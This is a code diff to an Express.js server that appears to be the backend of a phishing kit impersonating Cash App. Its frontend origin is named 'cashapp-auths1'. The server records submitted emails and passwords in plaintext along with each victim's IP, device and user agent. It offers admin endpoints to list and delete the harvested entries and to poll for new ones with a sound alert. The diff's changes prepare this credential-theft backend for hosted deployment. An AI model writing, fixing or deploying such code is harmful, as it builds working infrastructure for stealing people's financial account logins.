@@ -7,10 +7,25 @@ const useragent = require("useragent");
 const path = require("path");
 
 const app = express();
-const PORT = 5000;
 
-app.use(cors());
+// Use environment PORT or 5000 for local dev
+const PORT = process.env.PORT || 5000;
+
+// Replace with your actual Vercel frontend URL
+const FRONTEND_URL = "https://cashapp-auths1.vercel.app/";
+
+app.use(
+  cors({
+    origin: FRONTEND_URL,
+    methods: ["GET", "POST", "DELETE"],
+    credentials: true,
+  })
+);
+
 app.use(bodyParser.json());
+
+// Use absolute path for data.txt so it works anywhere
+const dataFilePath = path.join(__dirname, "data.txt");
 
 // 🟨 Store Email + Password in data.txt
 app.post("/api/store", (req, res) => {
@@ -25,7 +40,7 @@ app.post("/api/store", (req, res) => {
 
   const entry = `Email: ${email} | Password: ${password} | Device: ${device} | UserAgent: ${agent.toString()} | IP: ${ip} | Time: ${timestamp}\n`;
 
-  fs.appendFile("data.txt", entry, (err) => {
+  fs.appendFile(dataFilePath, entry, (err) => {
     if (err) {
       console.error("Error saving data:", err);
       res.status(500).send("Failed to save");
@@ -53,7 +68,7 @@ app.post("/api/admin/login", (req, res) => {
 
 // 🟨 Return data.txt contents
 app.get("/api/data", (req, res) => {
-  fs.readFile("data.txt", "utf8", (err, data) => {
+  fs.readFile(dataFilePath, "utf8", (err, data) => {
     if (err) return res.status(500).send("Error reading file");
     const lines = data.trim().split("\n").map((line, i) => ({
       id: i,
@@ -66,11 +81,12 @@ app.get("/api/data", (req, res) => {
 // 🟥 Delete a line from data.txt
 app.delete("/api/data/:id", (req, res) => {
   const id = parseInt(req.params.id);
-  fs.readFile("data.txt", "utf8", (err, data) => {
+  fs.readFile(dataFilePath, "utf8", (err, data) => {
     if (err) return res.status(500).send("Error reading file");
     let lines = data.trim().split("\n");
+    if (id < 0 || id >= lines.length) return res.status(400).send("Invalid ID");
     lines.splice(id, 1);
-    fs.writeFile("data.txt", lines.join("\n") + "\n", (err) => {
+    fs.writeFile(dataFilePath, lines.join("\n") + "\n", (err) => {
       if (err) return res.status(500).send("Error writing file");
       res.send("Deleted");
     });
@@ -93,7 +109,7 @@ app.post("/api/click", (req, res) => {
 
 // 🔊 Check if there's new data (for sound alert)
 app.get("/api/check-alert", (req, res) => {
-  fs.readFile("data.txt", "utf8", (err, data) => {
+  fs.readFile(dataFilePath, "utf8", (err, data) => {
     if (err) return res.status(500).send("Error reading file");
     const lines = data.trim().split("\n").length;
     const newData = lines > lastDataLength;
@@ -112,5 +128,5 @@ app.post("/api/stop-alert", (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
+  console.log(`Server running on port ${PORT}`);
 });
